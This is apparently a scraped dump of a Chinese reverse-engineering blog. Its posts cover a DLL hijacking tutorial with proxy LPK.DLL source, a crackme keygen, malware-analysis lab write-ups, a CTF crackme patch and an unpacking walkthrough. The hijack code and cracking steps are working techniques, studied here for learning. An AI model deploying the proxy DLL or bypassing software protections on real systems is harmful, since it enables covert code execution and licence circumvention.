&amp;emsp;&amp;emsp;●DLL劫持的实现●这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下： 1 、构造一个与系统目录下LPK.DLL一样的导出表； 2、加载系统目录下的LPK.DLL； 3、将导出函数转发到系统目录下的LPK.DLL上； 4、在初始化函数中加入我们要执行的代码。 我们使用VC++来进行开发，首先是定义导出函数。核心代码如下： #pragma comment(linker, &quot;/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1&quot;) #pragma comment(linker, &quot;/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4&quot;) #pragma comment(linker, &quot;/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetCharacterPlacement= _gamehacker_LpkGetCharacterPlacement,@7&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8&quot;) #pragma comment(linker, &quot;/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9&quot;) #pragma comment(linker, &quot;/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10&quot;) #pragma comment(linker, &quot;/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11&quot;) 以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下： ★ EXTERNC void __cdecl gamehacker_LpkEditControl(void); EXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = &#123;gamehacker_LpkEditControl&#125;; ★ LpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。加载系统目录下的LPK.DLL。核心代码如下： ★ inline BOOL WINAPI Load() { TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(“\\lpk”)); m_hModule&#x3D;LoadLibrary(tzPath); return (m_hModule !&#x3D; NULL); } ★在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。首先要获得原函数地址。核心代码如下： ★ FARPROC WINAPI GetAddress(PCSTR pszProcName) &#123; FARPROC fpAddress; CHAR szProcName[16]; TCHAR tzTemp[MAX_PATH]; fpAddress = GetProcAddress(m_hModule, pszProcName); return fpAddress; &#125; ★ 然后将我们构造的导出函数一一转发。核心代码如下： ★ ALCDECL gamehacker_LpkInitialize(void) &#123; GetAddress(&quot;LpkInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkTabbedTextOut(void) &#123; GetAddress(&quot;LpkTabbedTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDllInitialize(void) &#123; GetAddress(&quot;LpkDllInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDrawTextEx(void) &#123; GetAddress(&quot;LpkDrawTextEx&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkEditControl(void) &#123; GetAddress(&quot;LpkEditControl&quot;); __asm jmp DWORD ptr [EAX]; &#125; ALCDECL gamehacker_LpkExtTextOut(void) &#123; GetAddress(&quot;LpkExtTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetCharacterPlacement(void) &#123; GetAddress(&quot;LpkGetCharacterPlacement&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetTextExtentExPoint(void) &#123; GetAddress(&quot;LpkGetTextExtentExPoint&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkPSMTextOut(void) &#123; GetAddress(&quot;LpkPSMTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkUseGDIWidthCache(void) &#123; GetAddress(&quot;LpkUseGDIWidthCache&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_ftsWordBreak(void) &#123; GetAddress(&quot;ftsWordBreak&quot;); __asm JMP EAX; &#125; ★ 转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：★ memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(“LpkEditControl”) + 1),52); ★好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。 ★ BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) &#123; if (dwReason == DLL_PROCESS_ATTACH) &#123; DisableThreadLibraryCalls(hModule); if(Load()) &#123; memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(&quot;LpkEditControl&quot;) + 1),52); _beginthread(Init,NULL,NULL); &#125; else return FALSE; &#125; else if (dwReason == DLL_PROCESS_DETACH) &#123; Free(); &#125; return TRUE; &#125; ★ 在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。下面在初始化函数Init中写入测试代码如下： ★ void WINAPIV Init(LPVOID pParam); void WINAPIV Init(LPVOID pParam) &#123; TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; wsprintf(tzTemp, TEXT(&quot;劫持函数运行了.......&quot;), tzPath); MessageBox(NULL, tzTemp, TEXT(&quot;gamehacker&quot;), MB_ICONSTOP); return; &#125; ★","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"一个简单的crackme","slug":"逆向/一个简单的crackme","date":"2017-07-31T16:00:00.000Z","updated":"2024-03-12T09:46:48.229Z","comments":true,"path":"2017/08/01/逆向/一个简单的crackme/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E9%80%86%E5%90%91/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/","excerpt":"一、样本基本信息 程序链接 http://pan.baidu.com/s/1bSPUdK 二、分析过程 这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。 打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。 寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起， 继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，","text":"一、样本基本信息 程序链接 http://pan.baidu.com/s/1bSPUdK 二、分析过程 这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。 打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。 寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起， 继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc， 重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序， 程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80, 然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00, 然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235， 继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数__vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax&#x3D;0x31即ax&#x3D;31,最后得到edi的值为6*0x17cfb+0x31&#x3D;0x8ee13,然后程序调用__vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。 4.转化为c代码为： #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; int main() { char name[10]; int len&#x3D;0,key&#x3D;0; scanf(“%s”,&amp;name); len&#x3D;strlen(name); key&#x3D;len*0x17cfb+name[0]; printf(“AKA-“); printf(“%d\\n”,key); system(“pause”); return 0; }","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码分析第一记","slug":"逆向/恶意代码分析第一记","date":"2017-07-31T16:00:00.000Z","updated":"2024-03-12T09:45:53.204Z","comments":true,"path":"2017/08/01/逆向/恶意代码分析第一记/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/","excerpt":"一、样本基本信息 分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe 二、分析过程 首先在虚拟机里准备好必要的工具，静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。 动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。 静态分析步骤： • PEID 查壳 发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。 • PEVIew","text":"一、样本基本信息 分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe 二、分析过程 首先在虚拟机里准备好必要的工具，静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。 动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。 静态分析步骤： • PEID 查壳 发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。 • PEVIew 抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数, • Strings 用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。 ​ 动态分析步骤 首先运行process monitor、process explorer、ApateDNS、regshot等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。 在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码分析第二记","slug":"逆向/恶意代码分析第二记","date":"2017-07-31T16:00:00.000Z","updated":"2024-03-12T09:45:47.921Z","comments":true,"path":"2017/08/01/逆向/恶意代码分析第二记/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E9%80%86%E5%90%91/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E8%AE%B0/","excerpt":"一、样本基本信息 .样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll. 二、分析过程 首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp. 然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。 查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\\Windows\\System32\\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。","text":"一、样本基本信息 .样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll. 二、分析过程 首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp. 然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。 查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\\Windows\\System32\\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。 然后我们对lab07-03.dll进行静态ida反汇编看一下。dll的代码就很简单了，首先创建互斥体保证只有一个再运行，然后建立socket网络连接，ip是127.26.152.13，端口是80，首先 发送hello,并且利用shutdown()函数关闭套接字的写功能，然后就是recv进行监听了，如果受到的字符串是sleep就睡眠60秒，如果是exec那就是远程执行，创建进程，命令行参数此时未知。 下一步就是验证我们的猜想，在命令行加上正确的参数运行程序，构建好模拟网路和监控工具。 如图看到了文件映射的操作，以及大量的遍历操作，跟我们通过反汇编得到的结果几乎一致。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"迷路CTF","slug":"逆向/迷路","date":"2017-07-31T16:00:00.000Z","updated":"2024-03-12T09:46:21.082Z","comments":true,"path":"2017/08/01/逆向/迷路/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E9%80%86%E5%90%91/%E8%BF%B7%E8%B7%AF/","excerpt":"步骤如下 1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi 2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。） 3 打开OD载入程序，搜索字符串，发现关键字符串，很高兴。 在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。 继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。 4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：","text":"步骤如下 1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi 2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。） 3 打开OD载入程序，搜索字符串，发现关键字符串，很高兴。 在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。 继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。 4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示： 复制到可执行文件，保存文件。再次运行发现果然出现了两个输入按钮。 5.修改后的程序重新加载进OD，此时发现感觉没什么思路，对获取输入字符串的函数进行下断点，在IDA中发现有GetWindowText函数，双加该函数，ctrl+x 获取其引用的位置，记下地址，在OD中ctrl+g 查找，找到该函数位置下断点，重新运行程序，输入字符串，点击左边的Input,程序运行到断点处，F8单步运行，发现下面有一个call ,F7进去看看，发现是获取字符串的长度，感觉好多Crackme都会对字符串的长度进行检查，于是对存字符串的位置下一个内存访问断点，看看是否有什么意外的惊喜，F9运行程序，发现程序到了这，IDA查看此位置的反编译结果，发现果然是对字符串的长度进行了检查，0x27u说明字符串长度为39,79，79,67,84,70,123,125刚好是题目所说的格式00CTF{},继续运行寻找返回的地方。最后回到401f96的位置，此处果然为一个调用，检查长度和格式。如果不符合返回值为0，跳到失败的位置。符合的话返回值为1，继续往下进行。 6 继续往下分析，分析各个call 的作用，发现call 1.00401860 位置的call 有很大的嫌疑，里面有各种循环，猜测为算法处理过程，IDA定位此处位置分析基本确定此位置，继续向下运行，查找字符串比较的过程，发现地址为401fca的调用，是弹出错错误的位置，此处下断点，重新运行程序到这个位置，F7进去分析，同时打开IDA，定位此函数，辅助分析，果然发现了两个MessageBOXA函数。分析不同的弹框结果发现前面是一个字符串比较函数，IDA按table键定位此函数的位置。 进去发现是一个一个进行字符的比较，比较字符串b5h760h64R867618bBwB48BrW92H4w5r 错误的话最后函数返回值为1，弹出错误对话框。 7.现在的问题就只剩下解决算法出路的问题了。IDA反编译出的代码如下 分析可知其对数字不做变换，大写字母减去65然后再进行关键操作，V9&#x3D;(V6+V5V7)%26+((V6+V5V7)%26&lt;0?0X1a:0)v6在调试的时候会出现32-2-2&#x3D;28，v5情况有点复杂，可能是3或者5，待会再说为什么，小写字母减去97然后进行关键操作，这样就进行了字符串的变换。关于v6的问题：该数值最早是函数0041458e 的返回值，返回值为-1的时候就赋值为3，否则为原数。我用3进行测试的时候发现是错误的，那这个函数0041458e 就很有问题。在此处下断点，F7进去发现是再次调用了函数41459c,继续跟进去同时观察IDA的结果， 发现其实就是判断_mbschr((const unsigned __int8 *)(a3 + *(_DWORD *)this),a2))的结果，点击该函数进去，OD定位该位置，单步运行会发现，其实是检查输入字符串的第六位是否为0，如果为0则返回 值为0的地址，后面是字符串的地址减去该地址为5，即为v6,否则的话返回值为-1，在后面的判断中赋值为3.此为v6的具体赋值过程。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"Linux虚拟机无法开机","slug":"杂学/拯救我的虚拟机","date":"2017-07-21T16:00:00.000Z","updated":"2024-03-12T10:07:27.421Z","comments":true,"path":"2017/07/22/杂学/拯救我的虚拟机/","link":"","permalink":"http://zwjsfdbb.top/2017/07/22/%E6%9D%82%E5%AD%A6/%E6%8B%AF%E6%95%91%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA/","excerpt":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。 尝试方法1：找到虚拟机设置-&gt;选项-&gt;快照-&gt;恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。 尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置-&gt;硬盘-&gt;添加-&gt;硬盘-&gt;选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。","text":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。 尝试方法1：找到虚拟机设置-&gt;选项-&gt;快照-&gt;恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。 尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置-&gt;硬盘-&gt;添加-&gt;硬盘-&gt;选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"搭建虚拟网络环境inetsim","slug":"逆向/inetsim","date":"2017-07-21T16:00:00.000Z","updated":"2023-07-27T14:35:03.173Z","comments":true,"path":"2017/07/22/逆向/inetsim/","link":"","permalink":"http://zwjsfdbb.top/2017/07/22/%E9%80%86%E5%90%91/inetsim/","excerpt":"主要步骤详见 1.inetsim 安装详见http://www.inetsim.org/packages.html 2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","text":"主要步骤详见 1.inetsim 安装详见http://www.inetsim.org/packages.html 2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"esp脱壳+文件大小自校验","slug":"逆向/esp脱壳+文件大小自校验","date":"2017-07-14T16:00:00.000Z","updated":"2024-03-12T09:47:41.073Z","comments":true,"path":"2017/07/15/逆向/esp脱壳+文件大小自校验/","link":"","permalink":"http://zwjsfdbb.top/2017/07/15/%E9%80%86%E5%90%91/esp%E8%84%B1%E5%A3%B3+%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/","excerpt":"步骤如下1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。","text":"步骤如下1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。 5.文件大小自检 脱壳以后双击没得反应，可能是有文件大小自检校验，脱壳后的程序载入OD，在GetFileSize函数下断点，在插件中选API断点设置工具-&gt;常用API断点。选中文件类的GetFileSize.然后F9运行程序，到断点处停下，在堆栈中右键反汇编跟随，找到调用这个函数的位置，然后下断点，把刚刚的那个断点删除。在断点后发现是几个cmp ,很明显是比较文件大小，故而把这两个ｃｍｐ右键二进制－＞用ｎｏｐ填充。然后复制到可执行文件，保存文件。再次点击程序，发现正常运行。 **注：esp 定律** ESP定律算是我们在脱壳当中最常使用的方法之一，也特别适合像我一样的新手！而今天文章说的是ESP脱壳的原理和分析！只有知道原理了，我们的技术才能走得列远！ 一.准备知识在我们开始讨论ESP定律之前，我先给你讲解一下一些简单的汇编知识。 1.call 这个命令是访问子程序的一个汇编基本指令。也许你说，这个我早就知道了！别急请继续看完。call真正的意义是什么呢？我们可以这样来理解： 1.向堆栈中压入下一行程序的地址；2.JMP到call的子程序地址处。 例如： 代码: 00401029.E8 DA240A00 call 004A35080040102E.5A pop edx 在执行了00401029以后，程序会将0040102E压入堆栈，然后JMP到004A3508地址处！ 2.RETN 与call对应的就是RETN了。对于RETN我们可以这样来理解： 1.将当前的ESP中指向的地址出栈； 2.JMP到这个地址。 这个就完成了一次调用子程序的过程。在这里关键的地方是：如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。这也就是著名的“堆栈平衡”原理！ 3.狭义ESP定律 ESP定律的原理就是“堆栈平衡”原理。 让我们来到程序的入口处看看吧！ 1.这个是加了ASPACK壳的入口时各个寄存器的值！ 代码: EAX 00000000 ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 0040D000 ASPACK. 2.这个是ASPACK壳JMP到OEP后的寄存器的值！ 代码: EAX 004010CC ASPACK.004010CC ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 004010CC ASPACK.004010CC 